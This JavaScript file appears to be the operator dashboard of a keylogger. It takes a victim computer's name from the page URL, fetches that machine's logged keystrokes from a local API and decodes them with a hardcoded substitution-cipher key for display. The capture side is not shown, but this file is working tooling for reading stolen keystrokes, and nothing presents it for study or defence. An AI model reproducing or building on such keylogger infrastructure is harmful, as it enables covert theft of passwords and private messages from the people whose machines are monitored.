const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ".split("");
const nambers = "0123456789".split("")
const punctuation = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

const allCharacters = [...punctuation, ...nambers, ...letters];
console.log(allCharacters);
const key = ['H', 'E', 'n', 'x', '@', 'U', '5', 'P', '=', '0', '-', '3', 'm', '*', 'L', 'f', '7', 'g', '$', '!', 'V', '_', 'Z', 'O', 'X', '1', 'k', '?', '(', '\\', 'N', ':', 'e', 'p', '>', '`', 'h', '^', 'I', '#', 'a', 'Y', '"', 'l', 'Q', '[', ' ', 'C', 'J', '+', 'T', 's', '/', 'i', 't', 'S', ']', 'w', 'u', ')', 'A', 'F', '{', ',', '8', 'R', '2', '.', 'o', 'b', 'r', "'", '%', 'c', '&', 'D', ';', '<', '9', '4', 'd', 'z', '|', 'y', '}', 'j', 'G', '6', 'M', '~', 'v', 'B', 'W', 'q', 'K']
console.log(key.length)
const urlparams =  new URLSearchParams(window.location.search)
console.log(urlparams)
const computer = urlparams.get("computer")
console.log("computer:::::::",computer)
const h1 = document.getElementById("h1")
h1.textContent = computer


fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
    response => response.json().then(
        dat => {
            console.log(dat)
            dat.data.forEach(item => {
                // console.log(item.decrypted_words)
                const decrypted = deciphering(item.decrypted_words)
                const new_element = document.createElement("h3")
                new_element.setAttribute('class', 'the_data')
                new_element.appendChild(decrypted)
                // new_element.textContent = decrypted
                document.body.appendChild(new_element)
             
            });

        }
    )
)


const deciphering = (text) => {
    let new_d = document.createElement("div")
    let new_p = document.createElement("p")
    let decrypted = ""
    for (let i = 0; i < text.length; i++){
        let char = allCharacters[key.indexOf(text[i])]
        if (char != undefined){
            decrypted += char
        }else{
            if (text[i] == "\n"){
            new_p.textContent += decrypted
            new_d.appendChild(new_p)
            new_p = document.createElement("p")
            decrypted = ""
            }else{
                decrypted += text[i]
            }
        }
    }
    console.log(decrypted)
    return new_d
}

